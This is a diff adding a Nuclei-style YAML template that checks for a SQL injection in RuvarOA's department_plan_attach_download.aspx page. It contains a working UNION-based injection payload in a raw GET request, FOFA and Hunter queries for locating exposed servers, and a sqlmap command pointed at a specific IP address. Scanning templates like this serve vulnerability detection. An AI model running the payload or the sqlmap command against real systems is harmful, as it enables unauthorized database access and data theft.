@@ -1,0 +1,30 @@
+id: ruvaroa-department_plan_attach_download-sqli
+info:
+  name: RuvarOA 协同办公平台 department_plan_attach_download.aspx - sqli
+  author: leadlife
+  severity: high
+  description: RuvarOA是由广州市璐华计算机科技有限公司开发的一款企业协同办公平台。该平台继承了传统OA产品的所有优秀特性，并在此基础上增加了更齐全的功能模块，极大地扩大了应用的覆盖面。
+  reference: 
+    - https://github.com/wy876/POC/blob/f438c90ba8c03d44841a8129daa16a8535cab132/RuvarOA%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0/RuvarOA%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0%E5%A4%9A%E5%A4%84%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="txt_admin_key"
+    hunter-query: web.body="txt_admin_key"
+    sqlmap: sqlmap -u "http://113.119.86.101:8000/DepartmentPlan/department_plan_attach_download.aspx?sys_file_storage_id=" -p sys_file_storage_id --batch --random-agent --dbms="Microsoft SQL Server"
+  tags: ruvaroa,sqli,oa
+
+http:
+  - raw:
+      - |
+        GET /DepartmentPlan/department_plan_attach_download.aspx?sys_file_storage_id=%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2bCHAR%28106%29%2bCHAR%28118%29%2bCHAR%2898%29%2bCHAR%28113%29%2bCHAR%2873%29%2bCHAR%28107%29%2bCHAR%2866%29%2bCHAR%2881%29%2bCHAR%2871%29%2bCHAR%2889%29%2bCHAR%28114%29%2bCHAR%2888%29%2bCHAR%2871%29%2bCHAR%2876%29%2bCHAR%2866%29%2bCHAR%2890%29%2bCHAR%2886%29%2bCHAR%2874%29%2bCHAR%28109%29%2bCHAR%2898%29%2bCHAR%28106%29%2bCHAR%28107%29%2bCHAR%2885%29%2bCHAR%2871%29%2bCHAR%2877%29%2bCHAR%2899%29%2bCHAR%2885%29%2bCHAR%28103%29%2bCHAR%28118%29%2bCHAR%28101%29%2bCHAR%28120%29%2bCHAR%2874%29%2bCHAR%28117%29%2bCHAR%28109%29%2bCHAR%2865%29%2bCHAR%2882%29%2bCHAR%28105%29%2bCHAR%2876%29%2bCHAR%28102%29%2bCHAR%28120%29%2bCHAR%2887%29%2bCHAR%28101%29%2bCHAR%28105%29%2bCHAR%2884%29%2bCHAR%28113%29%2bCHAR%28118%29%2bCHAR%28113%29%2bCHAR%28118%29%2bCHAR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5807.225 Safari/537.36 Edg/112.0.1791.33
+        Connection: close
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'qjvbqIkBQGYrXGLBZVJmbjkUGMcUgvexJumARiLfxWeiTqvqvq')
+        condition: and
